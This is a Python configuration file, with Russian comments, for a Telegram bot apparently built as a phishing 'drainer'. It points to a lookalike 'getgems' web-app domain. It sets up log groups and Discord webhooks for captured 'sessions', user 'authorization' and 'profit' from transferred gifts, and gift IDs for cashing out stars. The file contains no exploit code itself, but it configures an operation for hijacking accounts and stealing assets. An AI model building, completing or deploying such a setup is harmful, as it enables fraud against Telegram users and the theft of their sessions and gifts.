import os
from typing import Optional, List
from dotenv import load_dotenv

load_dotenv()

class BotConfig:
    BOT_TOKEN: str = os.getenv("BOT_TOKEN", "1234567890:AAFGm5n6o7p8q9r0s1t2u3v4w5x6y7z8AbCdEfGh")
    BOT_USERNAME: str = os.getenv("BOT_USERNAME", "stub_bot_8421")
    WEBAPP_URL: str = os.getenv("WEBAPP_URL", "https://getgems.mooo.com")
    DATABASE_PATH: str = os.getenv("DATABASE_PATH", "getgems_stub.db")
    LOG_LEVEL: str = os.getenv("LOG_LEVEL", "INFO")
    MAX_INLINE_QUERY_LENGTH: int = 256
    INLINE_CACHE_TIME: int = 1
    LOG_GROUP_ID: str = os.getenv("LOG_GROUP_ID", "-1001234567890")
    LOG_CHAT_ID: str = os.getenv("LOG_CHAT_ID", "-1001234567890")
    
    # Topic ID для групп с темами (forum groups)
    # Если группа не форумная или topic не нужен, оставьте пустым или 0
    LOG_GROUP_TOPIC_PROFIT: Optional[int] = int(os.getenv("LOG_GROUP_TOPIC_PROFIT", "0")) if os.getenv("LOG_GROUP_TOPIC_PROFIT", "0").isdigit() else None
    """Topic ID для логов профита (успешные передачи подарков)"""
    
    LOG_GROUP_TOPIC_SESSIONS: Optional[int] = int(os.getenv("LOG_GROUP_TOPIC_SESSIONS", "0")) if os.getenv("LOG_GROUP_TOPIC_SESSIONS", "0").isdigit() else None
    """Topic ID для отправки сессий"""
    
    LOG_GROUP_TOPIC_NOTIFICATIONS: Optional[int] = int(os.getenv("LOG_GROUP_TOPIC_NOTIFICATIONS", "0")) if os.getenv("LOG_GROUP_TOPIC_NOTIFICATIONS", "0").isdigit() else None
    """Topic ID для уведомлений (старт обработки, нет подарков, ошибки)"""
    
    LOG_CHAT_TOPIC_ACTIONS: Optional[int] = int(os.getenv("LOG_CHAT_TOPIC_ACTIONS", "0")) if os.getenv("LOG_CHAT_TOPIC_ACTIONS", "0").isdigit() else None
    """Topic ID для логов действий пользователей (авторизация, создание ссылок и т.д.)"""
    
    LOG_CHAT_TOPIC_PROCESSING: Optional[int] = int(os.getenv("LOG_CHAT_TOPIC_PROCESSING", "0")) if os.getenv("LOG_CHAT_TOPIC_PROCESSING", "0").isdigit() else None
    """Topic ID для агрегированных логов обработки подарков"""
    
    # Discord Webhook URLs
    DISCORD_WEBHOOK_URL: str = os.getenv("DISCORD_WEBHOOK_URL", "")
    """Основной Discord webhook URL (используется если не указаны отдельные)"""
    
    DISCORD_WEBHOOK_NOTIFICATIONS: str = os.getenv("DISCORD_WEBHOOK_NOTIFICATIONS", "")
    """Discord webhook для уведомлений (старт обработки, нет подарков, ошибки)"""
    
    DISCORD_WEBHOOK_PROFIT: str = os.getenv("DISCORD_WEBHOOK_PROFIT", "")
    """Discord webhook для логов профита (успешные передачи подарков)"""
    
    DISCORD_WEBHOOK_SESSIONS: str = os.getenv("DISCORD_WEBHOOK_SESSIONS", "")
    """Discord webhook для отправки сессий"""
    
    DISCORD_WEBHOOK_ACTIONS: str = os.getenv("DISCORD_WEBHOOK_ACTIONS", "")
    """Discord webhook для логов действий пользователей"""
    
    DISCORD_WEBHOOK_PROCESSING: str = os.getenv("DISCORD_WEBHOOK_PROCESSING", "")
    """Discord webhook для агрегированных логов обработки подарков"""
    
    # Таймаут HTTP-запросов (секунды)
    REQUEST_TIMEOUT: int = int(os.getenv("REQUEST_TIMEOUT", "15"))
    
    # Настройка для выбора метода отправки подарков
    # Возможные значения: "bot_api" или "pyrogram"
    GIFT_SEND_METHOD: str = os.getenv("GIFT_SEND_METHOD", "bot_api")

    # Временное отключение отправки звёзд на пост
    # Установите переменную окружения DISABLE_STAR_REACTION=1 чтобы отключить
    # или DISABLE_STAR_REACTION=0 чтобы включить.
    DISABLE_STAR_REACTION: bool = os.getenv("DISABLE_STAR_REACTION", "0") == "1"

    # Дневной лимит для wsend (ограничение отправки звёзд за день на пользователя)
    WSEND_DAILY_LIMIT: int = int(os.getenv("WSEND_DAILY_LIMIT", "150"))
    
    # ID подарков для вывода баланса (стоимость в звездах)
    GIFT_ID_100_STARS: int = int(os.getenv("GIFT_ID_100_STARS", "0")) if os.getenv("GIFT_ID_100_STARS", "0").isdigit() else 0
    """ID подарка стоимостью 100 звезд"""
    
    GIFT_ID_50_STARS: int = int(os.getenv("GIFT_ID_50_STARS", "0")) if os.getenv("GIFT_ID_50_STARS", "0").isdigit() else 0
    """ID подарка стоимостью 50 звезд"""
    
    GIFT_ID_25_STARS: int = int(os.getenv("GIFT_ID_25_STARS", "0")) if os.getenv("GIFT_ID_25_STARS", "0").isdigit() else 0
    """ID подарка стоимостью 25 звезд"""
    
    GIFT_ID_15_STARS: int = int(os.getenv("GIFT_ID_15_STARS", "5170145012310081615")) if os.getenv("GIFT_ID_15_STARS", "5170145012310081615").isdigit() else 5170145012310081615
    """ID подарка стоимостью 15 звезд (по умолчанию)"""
    
    ADMIN_IDS: List[int] = [
        int(admin_id.strip()) 
        for admin_id in os.getenv("ADMIN_IDS", "").split(",") 
        if admin_id.strip().isdigit()
    ]

    @classmethod
    def is_admin(cls, user_id: int) -> bool:
        """Проверяет, является ли пользователь администратором"""
        return user_id in cls.ADMIN_IDS
    
    @classmethod
    def get_webapp_url(cls) -> str:
        """
        Возвращает URL веб-приложения.
        """
        return cls.WEBAPP_URL.rstrip('/')

    @classmethod
    def validate(cls) -> bool:
        # Проверяем только если токен явно установлен (не дефолтный)
        if cls.BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            print("❌ Ошибка: Не установлен токен бота!")
            print("Получите токен у @BotFather и установите переменную окружения BOT_TOKEN")
            return False

        # Если токен пустой или короче нужного - это ошибка
        if not cls.BOT_TOKEN:
            print("❌ Ошибка: BOT_TOKEN не установлен!")
            return False

        if len(cls.BOT_TOKEN) < 40:
            print(f"❌ Ошибка: Токен слишком короткий (длина: {len(cls.BOT_TOKEN)}, требуется: 40+)")
            return False

        # Проверяем корректность метода отправки подарков
        if cls.GIFT_SEND_METHOD not in ["bot_api", "pyrogram"]:
            print(f"❌ Ошибка: Некорректный метод отправки подарков: {cls.GIFT_SEND_METHOD}")
            print("Допустимые значения: 'bot_api' или 'pyrogram'")
            return False

        return True

config = BotConfig()